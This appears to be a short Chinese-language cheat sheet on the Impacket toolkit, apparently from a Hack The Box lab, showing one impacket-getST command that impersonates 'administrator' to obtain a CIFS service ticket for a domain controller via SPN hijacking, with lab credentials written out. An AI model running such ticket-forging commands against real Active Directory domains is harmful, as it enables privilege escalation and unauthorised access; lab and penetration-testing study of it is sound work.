# impacket 工具使用

```bash
# 项目地址
https://github.com/fortra/impacket
```

## 申请服务票据

```bash
# 可操作被攻击者 SPN 名执行 SPN 劫持攻击
# 注意 -altservice 参数，可指定申请的服务票据 SPN 名
impacket-getST -spn 'HTTP/WEB01.PIRATE.HTB' -impersonate 'administrator' -altservice 'cifs' pirate.htb/'A.WHITE_ADM':'Admin@123' -altservice 'cifs/DC01.pirate.htb'
```